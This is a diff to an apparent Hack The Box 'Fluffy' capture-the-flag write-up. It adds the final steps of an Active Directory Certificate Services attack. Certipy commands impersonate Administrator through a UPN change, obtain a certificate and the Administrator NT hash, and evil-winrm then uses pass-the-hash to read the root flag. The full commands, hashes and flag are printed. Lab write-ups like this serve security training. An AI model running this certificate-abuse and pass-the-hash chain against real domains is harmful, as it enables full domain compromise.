@@ -570,6 +570,8 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 ```
 
+Request cert as ca_svc (now pretending to be Administrator):
+
 ```
 certipy-ad req -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.131.175 -dc-host DC01.fluffy.htb -ca fluffy-DC01-CA -template User
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -585,6 +587,8 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 ```
 
+Restore ca_svc's UPN
+
 ```
 certipy-ad account update -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -upn ca_svc@fluffy.htb -dc-ip 10.129.131.175 -dc-host DC01.fluffy.htb
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -594,6 +598,8 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Successfully updated 'ca_svc'
 
 ```
+
+Authenticate with the cert to get Admin hash:
 
 ```
 certipy-ad auth -pfx administrator.pfx -username Administrator -domain fluffy.htb -dc-ip 10.129.131.175
@@ -611,6 +617,24 @@ File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will sav
 [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
 ```
 
+## Root flag:
+
+```
+evil-winrm -i fluffy.htb -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+608919be33108b9168a732c18f4eb014
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> censor the flag
+```
 ---
 ## Remediation
 
